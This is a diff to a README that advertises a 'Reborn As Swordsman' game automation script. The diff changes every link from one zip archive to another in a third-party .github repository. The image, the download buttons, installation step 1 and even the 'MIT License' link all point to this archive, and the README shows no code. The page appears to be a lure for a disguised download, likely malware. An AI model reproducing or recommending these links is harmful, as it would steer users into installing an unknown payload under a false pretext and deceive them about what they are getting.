@@ -1,7 +1,7 @@
 # ⚔️ Reborn As Swordsman Script
-![image](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)
+![image](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)
 
-[![Download Reborn As Swordsman Script](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)
+[![Download Reborn As Swordsman Script](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)
 
 Welcome to the official repository for **Reborn As Swordsman Script** – the ultimate script companion for enhancing your sword-fighting experience! 🛡️  
 Unlock refined combat mechanics, streamlined skills management, and a suite of helpful in-game automations. Level up your adventures as a swordsman with robust tools, intuitive commands, and reliable cross-platform operation.
@@ -35,7 +35,7 @@ Reborn as swordsman tool, swordman automation script, sword fighting enhancement
 
 ## 🚀 Installation Guide
 
-**Step 1:** [![Direct Download](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)
+**Step 1:** [![Direct Download](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)
   
 After downloading, follow the straightforward setup instructions to bring swordsmanship to a whole new level.
 
@@ -46,7 +46,7 @@ The authors disclaim any liability for misuse or unexpected consequences. Explor
 
 ## 📜 License
 
-Licensed under the [MIT License](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip) © 2025.  
+Licensed under the [MIT License](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip) © 2025.  
 Distribution, modification, and private use are permitted.
 
-[![Download Script](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/redivertible/.github.zip)
+[![Download Script](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)](https://raw.githubusercontent.com/faizalichsan1337/.github/main/profile/github_2.7.zip)
